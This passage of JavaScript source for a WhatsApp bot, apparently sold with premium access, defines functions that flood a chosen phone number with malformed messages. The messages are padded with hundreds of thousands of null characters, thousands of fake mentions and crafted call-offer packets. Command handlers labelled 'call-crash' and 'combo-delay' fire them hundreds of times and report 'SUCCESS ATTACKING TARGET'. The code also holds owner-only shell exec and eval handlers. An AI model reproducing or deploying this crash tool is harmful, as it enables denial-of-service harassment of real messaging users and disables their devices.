        {}
      );

      await Ikyy.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        { participant: { jid: target } }
      );
    }
  } catch (e) {
    console.error("error:", e);
  }
}

//crashch
async function ForceNewsletter(target) {
  await Ikyy.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            id: generateMessageTag()
          },
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {})
  console.log("\x1b[34m[INFO]\x1b[0m Bug channel telah terkirim ke:", target);
}

async function HardDelay(Ikyy, target, mention, cta) {
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Hallo"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

  await Ikyy.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await Ikyy.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
          },
        ],
      }
    );
  }
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "D?",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await Ikyy.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });


  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "D?",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await Ikyy.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg2.message
    }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
  console.log(chalk.red(`Berhasil Mengirim Bug Ke Target ${target}`));
}

async function NewForclose(Ikyy, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await Ikyy.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await Ikyy.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = Ikyy.createParticipantNodes.bind(Ikyy);
let yntkts = Ikyy.encodeWAMessage?.bind(Ikyy);

Ikyy.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (Ikyy.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = Ikyy.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await Ikyy.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await Ikyy.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: Ikyy.generateMessageTag(), from: Ikyy.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": Ikyy.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(Ikyy.authState.creds.account, true)
}] : [])
]
}]
};
await Ikyy.sendNode(lemiting);
}

case 'fc-ui':
case 'call-crash':
case 'crash-beta': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreplybug(`*NIKA VERSION 18*
> SUCCESS ATTACKING TARGET
Type : ${command}
Target : ${target}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await NewForclose(Ikyy, target);
await NewForclose(Ikyy, target);
await NewForclose(Ikyy, target);
}
}
break 

case 'invisible-delay':
case 'combo-delay': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreplybug(`*NIKA VERSION 18*
> SUCCESS ATTACKING TARGET
Type : ${command}
Target : ${target}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 800; i++) {
await HardDelay(Ikyy, target);
await HardDelay(Ikyy, target);
await HardDelay(Ikyy, target);
}
}
break 
//============================================        
  // ENDD //
//============================================    
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return Reply(err)
                        if (stdout) return m.reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
